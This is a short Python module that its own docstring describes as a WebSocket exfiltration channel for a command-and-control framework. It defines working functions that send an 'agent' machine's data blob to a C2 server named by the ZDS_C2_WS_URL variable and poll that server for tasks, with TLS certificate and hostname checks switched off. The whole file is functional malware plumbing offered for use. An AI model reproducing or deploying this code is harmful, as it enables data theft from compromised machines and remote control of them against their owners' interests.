"""
WebSocket exfil channel.
Implements send/get interface expected by adaptive_channel_manager.
Configure via ZDS_C2_WS_URL environment variable.
"""
from __future__ import annotations
import json
import os


def send_via_ws(agent_id: str, data_blob: dict) -> bool:
    ws_url = os.environ.get("ZDS_C2_WS_URL", "")
    if not ws_url:
        return False
    try:
        import asyncio
        import websockets
        async def _send():
            async with websockets.connect(ws_url, ssl=_get_ssl(ws_url)) as ws:
                payload = json.dumps({"agent_id": agent_id, "data": data_blob})
                await ws.send(payload)
                resp = await ws.recv()
                result = json.loads(resp)
                return result.get("status") == "ok"
        return asyncio.run(_send())
    except Exception as e:
        print(f"[exfil_ws] send failed: {e}")
        return False


def get_task_ws(agent_id: str) -> dict | None:
    ws_url = os.environ.get("ZDS_C2_WS_URL", "")
    if not ws_url:
        return None
    try:
        import asyncio
        import websockets
        async def _poll():
            async with websockets.connect(ws_url, ssl=_get_ssl(ws_url)) as ws:
                await ws.send(json.dumps({"agent_id": agent_id, "op": "poll"}))
                response = await ws.recv()
                data = json.loads(response)
                return data if data.get("task") else None
        return asyncio.run(_poll())
    except Exception as e:
        print(f"[exfil_ws] poll failed: {e}")
        return None


def _get_ssl(url: str):
    if url.startswith("wss://"):
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    return None
